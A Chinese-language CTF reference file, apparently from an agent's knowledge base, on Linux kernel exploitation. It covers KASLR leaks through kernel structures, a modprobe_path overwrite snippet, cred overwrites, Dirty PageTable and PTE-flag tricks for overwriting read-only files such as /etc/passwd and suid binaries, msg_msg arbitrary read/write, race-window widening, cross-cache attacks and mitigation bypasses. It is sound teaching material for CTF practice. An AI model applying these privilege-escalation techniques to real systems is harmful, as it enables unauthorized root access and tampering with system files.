# Pwn 内核利用方法论 — 结构体泄漏、落点与竞态

> 内核 pwn 详细参考。标准流程见 `$SHARED_DIR/knowledge-base/pwn-methodology.md`。
> 本文件聚焦 Linux 内核漏洞利用（LPE/提权）。用户态堆利用见 `pwn-heap-methodology.md`。

## 触发条件

- 题目提供内核镜像（`bzImage`）+ 文件系统（`rootfs.cpio`/`initramfs.cpio.gz`）+ 启动脚本（`boot.sh`/`run.sh`）
- 或题目描述提到 kernel/driver/LPE/内核模块
- `dmesg` 或驱动源码中看到 `kmalloc`/`copy_from_user`/`ioctl`

## §1 基础设施

### 环境搭建
```bash
# 解包文件系统
mkdir rootfs && cd rootfs
zcat ../rootfs.cpio.gz | cpio -idmv

# 添加 exploit（编译时用对应内核的 gcc + 静态链接）
gcc -static -o exploit exploit.c
# 或 musl-gcc -static -o exploit exploit.c（更小）

# 重新打包
find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz

# qemu 启动（典型参数）
qemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio.gz \
  -append "console=ttyS0 root=/dev/ram quiet" -nographic -m 128M
# 如需调试加: -s（gdbserver :1234）-S（暂停启动）
```

### 内核符号表
- 有 `/proc/kallsyms`：直接 `cat /proc/kallsyms | grep commit_creds`
- 无（KASLR + 隐藏符号）：需要泄漏内核基址（见 §2）

## §2 结构体泄漏表（KASLR 绕过）

> UAF 块被含函数指针的内核结构体重用 → 读出函数指针 → 计算内核基址。

| 结构体 | 触发方式 | kmalloc slab | 泄漏内容 |
|--------|---------|-------------|---------|
| `tty_struct` | `open("/dev/ptmx")` | 0x2e0 (kmalloc-1024) | `tty_operations` 指针（含 kernel .text 地址） |
| `seq_operations` | `open("/proc/self/stat")` | kmalloc-32 | 4 个函数指针（start/stop/next/show） |
| `msg_msg` | `msgsnd()` | 可变（按消息长度选 slab） | 配合 MSG_COPY 可部分读；改 `m_ts` 越界读 |
| `pipe_buffer` | `pipe()` + `write()` | kmalloc-1024 | `anon_pipe_buf_ops` 指针 |
| `shm_file_data` | `shmat()` | kmalloc-64 | 多个内核指针 |

**泄漏后计算**：
```c
// 假设泄漏了 tty_operations 地址
kernel_base = leaked_addr - known_offset;  // offset 从 /proc/kallsyms 或 vmlinux 获取
```

## §3 内核落点

### 落点 A：modprobe_path（最简单 LPE）
**场景**: 有内核任意写，`modprobe_path` 未受 CONFIG 保护

```c
// 1. 泄漏 kernel base，算出 modprobe_path 地址
// 2. 任意写覆盖 modprobe_path 为 "/tmp/x"
// 3. 写提权脚本
system("echo '#!/bin/sh\necho 0 > /proc/sys/kernel/kptr_restrict\nchmod 777 /flag' > /tmp/x");
chmod("/tmp/x", 0777);
// 4. 触发 modprobe（执行未知格式文件）
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/bad");
chmod("/tmp/bad", 0777);
system("/tmp/bad");  // 内核调用 modprobe_path → 以 root 执行 /tmp/x
// 5. 读 flag
system("cat /flag");
```

### 落点 B：cred 覆写
**场景**: 能控制函数指针调用（如 commit_creds/prepare_kernel_cred 可达）

```c
// 经典 ROP/函数指针调用链
commit_creds(prepare_kernel_cred(0));  // 当前进程提权到 root
// 然后返回用户态（需正确处理 KPTI）
```

### 落点 C：Dirty PageTable（PTE 劫持）
**场景**: 页级 UAF

```
原理: 页级 UAF → PTE 页回收 → 改 PTE 物理页号指向任意物理页
步骤:
  1. 制造 page-level UAF（通过 cross-cache 回收到 PCP 分配器）
  2. 喷射 PTE 页占位（大量 mmap 使内核分配页表页）
  3. 改写 PTE 项: 修改物理页号字段指向目标物理地址
  4. 通过该 PTE 映射的虚拟地址读写任意物理内存
  5. 改 creds 或覆盖 suid 二进制
变体: 重叠"匿名页 PTE"与"文件页 PTE"，
  使只读文件映射经匿名侧可写 → 任意文件写
```

**变体详解: PTE overlap 任意文件写**
```
原理: 让一个物理页同时被"匿名映射 PTE 页"和"文件映射 PTE 页"占用
       匿名侧可写、文件侧只读 → 经匿名侧改写 → CPU 置 D bit → munmap 回写文件
步骤:
  1. 喷射匿名映射 PTE 页: mmap 大量 MAP_ANONYMOUS|MAP_SHARED（可写），按 PTE 索引布局
  2. 喷射文件映射 PTE 页: mmap 目标文件（如 /bin/umount）为 PROT_READ|MAP_SHARED（只读）
  3. page-level UAF（经 cross-cache 回收）让一个物理页同时被两类 PTE 页占用
  4. 扫描匿名侧找文件内容特征（如 \x7fELF）→ 发现 overlap
  5. 经匿名侧（可写）改写文件页内容 → 写入 shebang（#!/tmp/.helper\n）指向提权脚本
  6. CPU 自动置 D(dirty) bit → munmap 时内核写回文件 → 只读文件被永久覆写
  7. 触发: 让目标 suid 二进制（如 /bin/umount）被执行 → 走 shebang → 提权
优势: 比 Dirty Pagetable 改地址字段更简单；内存效率高（同一文件反复 mmap 只占一个物理页）
注: 用 read syscall 写内存而非直接写（UAF 时不知哪个 PTE 被改，直接写只读页会 SIGSEGV，read 返回 -1 不崩溃）
```

### 落点 D：Dirty Pageflags（PTE flag 翻转，比 PageTable 更简单）
**场景**: 有页级 UAF，但不需要改 PTE 地址字段，只需翻转 flags

```
原理: 不覆写 PTE 的物理地址（Dirty Pagetable 做法），而是翻转 PTE 的 flags 位
关键 flags:
  - R/W (Read/Write): 0=只读, 1=可写
  - U/S (User/Supervisor): 0=仅内核, 1=用户态可访问
  - P (Present): 0=触发缺页, 1=在内存中
  - XD (Execute Disable): 1=禁止执行

攻击步骤:
  1. 目标文件（如 /etc/passwd）被 mmap 为只读（R/W=0）
  2. 页级 UAF → PTE 页回收 → 喷射占位
  3. 翻转该文件 PTE 的 R/W 位: 0→1
  4. 写入修改 → CPU 自动设置 D (Dirty) bit
  5. munmap 时内核看到 D bit → 认为页被修改 → 写回文件 → 只读文件被覆写
优势: 只翻转一个 bit，比改地址字段更简单、更不容易触发检测
```

## §4 msg_msg 任意读写

**核心**: msg_msg 头部有 `m_ts`（消息大小）和 `next`（指向 msg_msgseg 数据段）。

```
任意读:
  1. msgsnd 申请 msg_msg（可控制 size 选 kmalloc slab）
  2. UAF 改大 m_ts → 越界读邻居 slab 泄漏
  3. 伪造 next 指针 → 任意地址读
  4. msgrcv 配合 MSG_COPY 实现无破坏读

任意写:
  配合 pipe_buffer / sk_buff（含有 write 函数指针的 ops）实现
```

## §5 竞态窗口扩大法（userfaultfd 替代）

> 现代 kernel 题 `userfaultfd` 普遍被禁用（需 `CAP_SYS_PTRACE`）。以下是替代方案。

| 方法 | 原理 | 适用场景 |
|------|------|---------|
| **FUSE** | 用户态 FUSE 文件系统阻塞内核 `read`，stall `copy_from_user` | 能触发内核读用户态数据 |
| **MADV_DONTNEED + 并发 mprotect** | MADV_DONTNEED 清 PTE 使每页缺页；另一线程疯狂 mprotect 翻转权限争抢 mmap_lock，把毫秒级窗口拖到数十秒 | 长遍历（哈希/check）中的竞态 |
| **io_uring** | 异步 IO stall | 内核 ≥ 5.1 且未禁 io_uring |
| **fallocate** | `fallocate(FALLOC_FL_PUNCH_HOLE)` 延迟 | 特定文件操作竞态 |
| **SIGALRM + 多线程** | 在 io 操作中插入可中断点 | 简单竞态 |

### MADV_DONTNEED + mprotect 详解
```c
// 线程 A: 疯狂翻转权限
while (racing) {
    mprotect(page, PAGE_SIZE, PROT_READ);
    mprotect(page, PAGE_SIZE, PROT_READ | PROT_WRITE);
    usleep(1);
}
// 主线程: MADV_DONTNEED 使 PTE 失效
madvise(page, PAGE_SIZE, MADV_DONTNEED);
// 线程 B: 触发长遍历（使缺页重试，拖住内核）
// → 在窗口内竞态触发漏洞
```

**机制（为什么有效）**——单独任一操作都不够，slowdown 来自两者交互:
1. `MADV_DONTNEED` 经 `zap_page_range_single`（madvise.c:845）清掉 PTE
2. 遍历大虚拟地址区时每页触发 page fault（fault-heavy）
3. `mprotect` 线程反复获取 `mmap_write_lock`（mprotect.c:740）并重写 VMA/PTE
4. fault 路径在 page-table 和 mmap 锁上争用，反复 retry（memory.c:3305）
5. 调 `usleep` 可把窗口从几毫秒拉到数十秒

> 关键: `MADV_DONTNEED` 使遍历 fault-heavy，`mprotect` 使这些 fault 昂贵——缺一不可。目标线程需被迫 walk 大虚拟地址范围（如哈希/check 遍历）。

## §6 cross-cache 攻击（跨 slab 缓存）

**场景**: 独立 slab 缓存（`SLAB_NO_MERGE`）的 UAF 只能拿到同类对象，需要跨类型重用。

**阈值计算（为什么单 CPU 不够）**:
- `objs_per_slab`（每 slab 对象数）和 `cpu_partial`（每 CPU partial 保留阈值）决定何时触发 `discard_slab`
- 例: `objs_per_slab=56`, `cpu_partial=120` → 每 CPU partial 保留 `ceil(120*2/56)=5` slabs
- 单 CPU 分配 N 个对象只能 touch `ceil(N/56)` slabs（如 N=128 → 3 slabs），远不够触发 discard_slab

**跨 CPU 积累法**:
```
原理: 把独立缓存的页归还 buddy allocator，再用别的 slab（msg_msg/pipe/PTE 页）回收该页
步骤（cross-CPU 法）:
  1. sched_setaffinity 绑定 CPU0 分配、CPU1 释放
  2. CPU0 分配建 slab（消耗 CPU0 当前 slab），CPU1 free 把页挂入 CPU1 partial
     （关键: 不同 CPU free 时，SLUB 把页挂入 free 方 CPU 的 partial，而非回收给分配方）
  3. 重复此模式 → CPU0 持续建新 slab，CPU1 partial 积累
  4. CPU1 partial 满后推 node partial → node partial 满后才 discard_slab → 页回 buddy/PCP
  5. 喷射目标结构体（msg_msg/pipe/PTE 页）回收该页
  6. UAF 块与目标结构体重叠 → 读写目标内容
```

## §7 mitigations 绕过组合

| 缓解 | 绕过 |
|------|------|
| KASLR | §2 结构体函数指针泄漏 |
| SMEP（不可执行用户页） | 内核 ROP / 栈迁移 / pt_regs 中的用户栈做 ROP |
| SMAP（不可读用户页） | `copy_from/to_user` / msg_msg 等内核内数据 |
| KPTI（隔离页表） | `swapgs_restore_regs_and_return_to_usermode` 跳板 |
| kCFI（函数指针类型校验） | 同签名合法目标（如 commit_creds 与同类函数） |
| CFI 严苛时 | 改用非函数指针落点（modprobe_path / Dirty PageTable / 任意文件写） |

**返回用户态**（绕 KPTI）:
```c
// 不能直接 ret 到用户态函数（KPTI 隔离）
// 用 swapgs_restore_regs_and_return_to_usermode + offset
// 或 modprobe_path 路径（无需切态）
```

## §8 关联文件

- `$SHARED_DIR/knowledge-base/pwn-methodology.md` — 标准 8 步流程、mitigations 速查
- `$SHARED_DIR/knowledge-base/pwn-heap-methodology.md` — 用户态堆利用详解
